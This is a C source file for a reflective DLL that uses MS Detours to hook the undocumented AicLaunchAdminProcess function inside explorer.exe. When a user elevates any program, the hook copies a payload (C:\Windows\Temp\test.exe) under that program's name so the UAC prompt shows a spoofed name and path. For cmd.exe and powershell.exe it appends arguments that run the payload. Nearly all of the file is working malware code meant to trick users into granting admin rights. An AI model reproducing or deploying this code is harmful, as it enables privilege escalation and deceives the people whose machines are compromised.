/**
Reflective dll that hooks the undocumented AicLaunchAdminProcess function used in the explorer.exe 
process using MS Detours, so that when the user tries to launch an application as admin, 
C:\Windows\Temp\test.exe is copied to the same directory as the same name as the application the user tries to start. 
The UAC prompt will display the same name as the real exe. The "program location" displayed when the user clicks "Show more details"
is simply the arguments to the exe, where the first argument is assumed to be the exe path, so it is spoofed to be the real exe path. 
If powershell.exe or cmd.exe is executed, a stealthier method will be used. 
It will instead append an argument to run the payload (-c C:\Windows\Temp\test.exe).
When the user accepts the UAC prompt, test.exe will be executed as admin. 
 */

#include "ReflectiveLoader.h"
#include "FindLaunchAdminFunc.h"
#include <stdio.h>
#include <Tlhelp32.h>
#include <stdlib.h>
#include <tchar.h>
#include "detours.h"
#define MAKEINTRESOURCE  MAKEINTRESOURCEW

extern HINSTANCE hAppInstance;

ULONG_PTR(WINAPI* TrueAicLaunchAdminProcess)(
	LPWSTR lpApplicationName,
	LPWSTR lpParameters,
	DWORD UacRequestFlag,
	DWORD dwCreationFlags,
	LPWSTR lpCurrentDirectory,
	HWND hWnd,
	PVOID StartupInfo,
	PVOID ProcessInfo,
	ELEVATION_REASON* ElevationReason
	) = NULL;


typedef ULONG_PTR(WINAPI* pfnAipFindLaunchAdminProcess)(
	LPWSTR lpApplicationName,
	LPWSTR lpParameters,
	DWORD UacRequestFlag,
	DWORD dwCreationFlags,
	LPWSTR lpCurrentDirectory,
	HWND hWnd,
	PVOID StartupInfo,
	PVOID ProcessInfo,
	ELEVATION_REASON* ElevationReason);

/**
* get an element (file name, base path) from a path.
* @param part The part to extract. 0 for base path, 1 for file name
*/
DWORD GetElementFromPath(const wchar_t* szPathName,
	wchar_t* outbuf,
	DWORD   outbufsize, DWORD part)
{
	wchar_t   szDrive[_MAX_DRIVE] = { 0 };
	wchar_t   szDir[_MAX_DIR] = { 0 };
	wchar_t   szFname[_MAX_FNAME] = { 0 };
	wchar_t   szExt[_MAX_EXT] = { 0 };
	size_t  PathLength;
	DWORD   dwReturnCode;

	// Parameter validation
	if (szPathName == NULL || outbuf == NULL)
	{
		return FAILURE_NULL_ARGUMENT;
	}

	// Split the path into it's components
	dwReturnCode = _wsplitpath_s(szPathName, szDrive, _MAX_DRIVE, szDir, _MAX_DIR, szFname, _MAX_FNAME, szExt, _MAX_EXT);
	if (dwReturnCode != 0)
	{
		_ftprintf(stderr, TEXT("Error splitting path. _tsplitpath_s returned %d.\n"), dwReturnCode);
		return FAILURE_API_CALL;
	}

	// Check that the provided buffer is large enough to store the results and a terminal null character
	PathLength = wcslen(szDrive) + wcslen(szDir);
	if ((PathLength + sizeof(TCHAR)) > outbufsize)
	{
		_ftprintf(stderr, TEXT("Insufficient buffer. Required %d. Provided: %d\n"), PathLength, outbufsize);
		return FAILURE_INSUFFICIENT_BUFFER;
	}
	if (part == 0) {
		// Copy the szDrive and szDir into the provide buffer to form the basepath
		if ((dwReturnCode = wcscpy_s(outbuf, outbufsize, szDrive)) != 0)
		{
			_ftprintf(stderr, TEXT("Error copying string. _tcscpy_s returned %d\n"), dwReturnCode);
			return FAILURE_API_CALL;
		}
		if ((dwReturnCode = wcscat_s(outbuf, outbufsize, szDir)) != 0)
		{
			_ftprintf(stderr, TEXT("Error copying string. _tcscat_s returned %d\n"), dwReturnCode);
			return FAILURE_API_CALL;
		}
	}
	else {
		if ((dwReturnCode = wcscpy_s(outbuf, outbufsize, szFname)) != 0)
		{
			_ftprintf(stderr, TEXT("Error copying string. _tcscpy_s returned %d\n"), dwReturnCode);
			return FAILURE_API_CALL;
		}
		if ((dwReturnCode = wcscat_s(outbuf, outbufsize, szExt)) != 0)
		{
			_ftprintf(stderr, TEXT("Error copying string. _tcscat_s returned %d\n"), dwReturnCode);
			return FAILURE_API_CALL;
		}
	}
	return SUCCESS;
}

void copy_file(const wchar_t* src, wchar_t* dst) {
	FILE* source, * destination;
	//char* buffer;
	int ch;
	_wfopen_s(&source, src, L"rb");
	_wfopen_s(&destination, dst, L"wb");
	fseek(source, 0, SEEK_END); // Jump to the end of the file
	long filelen = ftell(source); // Get the current byte offset in the file
	rewind(source);
	int i;
	for (i = 0; i < filelen; i++) {
		ch = fgetc(source);
		//if (ch >= 0)
		fputc(ch, destination);
	}
	fclose(source);
	fclose(destination);
}

/**
* copy file from a path into another filename in the same path
*/
int copy_file_same_dir(const wchar_t* src_path, LPCWSTR dst_fname, wchar_t* ret_path) {
	wchar_t  base_path[MAX_PATH_LEN];
	//wchar_t  base_path_s[MAX_PATH_LEN]; //source
	wchar_t  base_path_d[MAX_PATH_LEN]; //destination
	GetElementFromPath(src_path, base_path, MAX_PATH_LEN, 0);
	wcscpy_s(base_path_d, MAX_PATH_LEN, base_path);
	wcscat_s(base_path_d, MAX_PATH_LEN, dst_fname);
	copy_file(src_path, base_path_d);
	wcscpy_s(ret_path, MAX_PATH_LEN, base_path_d);
	return 0;
}

/**
* If lpApplicationName is powershell or cmd, append to lpParameters to run payload.
* Otherwise, copies payload to same name as app name from lpApplicationName and keeps
* original lpParameters to spoof path. 
*/
ULONG_PTR WINAPI AicLaunchAdminProcessHook(
	LPWSTR lpApplicationName,
	LPWSTR lpParameters,
	DWORD UacRequestFlag,
	DWORD dwCreationFlags,
	LPWSTR lpCurrentDirectory,
	HWND hWnd,
	PVOID StartupInfo,
	PVOID ProcessInfo,
	ELEVATION_REASON* ElevationReason) {
	wchar_t* payload_teplate = L"C:\\Windows\\Temp\\test.exe";
	ULONG new_ElevationReason = 10;
	WCHAR new_payload_name[MAX_PATH_LEN];
	//WCHAR new_lpParameters[MAX_ARGS_LEN];
	DWORD NewUacRequestFlag = 17; //admin

	if (_wcsicmp(lpApplicationName, L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe") == 0) {
		wcscat_s(lpParameters, MAX_PATH_LEN, L"-c \"& C:\\Windows\\Temp\\test.exe\"");
	}
	else if (_wcsicmp(lpApplicationName, L"C:\\WINDOWS\\System32\\cmd.exe") == 0) {
		wcscat_s(lpParameters, MAX_PATH_LEN, L"/c \"C:\\Windows\\Temp\\test.exe\"");
	}
	else {
		//get file name to spoof
		GetElementFromPath(lpApplicationName, new_payload_name, MAX_PATH_LEN, 1);
		wchar_t* payload_path = (wchar_t*)malloc(sizeof(wchar_t) * MAX_PATH_LEN);
		//copy template into the filename of target
		copy_file_same_dir(payload_teplate, new_payload_name, payload_path);
		wcscpy_s(lpApplicationName, MAX_PATH_LEN, payload_path);
	}
	ULONG_PTR ret = TrueAicLaunchAdminProcess(lpApplicationName, lpParameters, NewUacRequestFlag, dwCreationFlags, lpCurrentDirectory, hWnd, StartupInfo, ProcessInfo, ElevationReason);
	return ret;
}

DWORD FindProcessId(const WCHAR* processname)
{
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;
	DWORD result = NULL;
	wchar_t  exeFile[260];
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hProcessSnap) return(FALSE);
	pe32.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(hProcessSnap, &pe32))
	{
		CloseHandle(hProcessSnap);
		return(NULL);
	}

	do
	{
		swprintf(exeFile, 260, L"%hs", pe32.szExeFile);
		if (0 == _wcsicmp(processname, exeFile))
		{
			result = pe32.th32ProcessID;
			break;
		}
	} while (Process32Next(hProcessSnap, &pe32));
	CloseHandle(hProcessSnap);
	return result;
}


BOOL WINAPI DllMain(HINSTANCE hinst, DWORD dwReason, LPVOID reserved)
{
	LONG error;
	NTSTATUS ErrorCode;
	(void)hinst;
	(void)reserved;
	PVOID LaunchAdminProcessPtr = NULL;

	if (DetourIsHelperProcess()) {
		return TRUE;
	}

	if (dwReason == DLL_PROCESS_ATTACH) {

		hAppInstance = hinst;
		DetourRestoreAfterWith();
		LaunchAdminProcessPtr = (PVOID)AicFindLaunchAdminProcess(&ErrorCode);
		TrueAicLaunchAdminProcess = (pfnAipFindLaunchAdminProcess)LaunchAdminProcessPtr;
		DetourTransactionBegin();
		DetourUpdateThread(GetCurrentThread());
		DetourAttach(&(PVOID&)TrueAicLaunchAdminProcess, AicLaunchAdminProcessHook);
		error = DetourTransactionCommit();
	}
	else if (dwReason == DLL_PROCESS_DETACH) {
		DetourTransactionBegin();
		DetourUpdateThread(GetCurrentThread());
		// Detach functions found from the export table.
		if (TrueAicLaunchAdminProcess != NULL) {
			DetourDetach(&(PVOID&)TrueAicLaunchAdminProcess, AicLaunchAdminProcessHook);
		}
		error = DetourTransactionCommit();
		fflush(stdout);
	}
	return TRUE;
}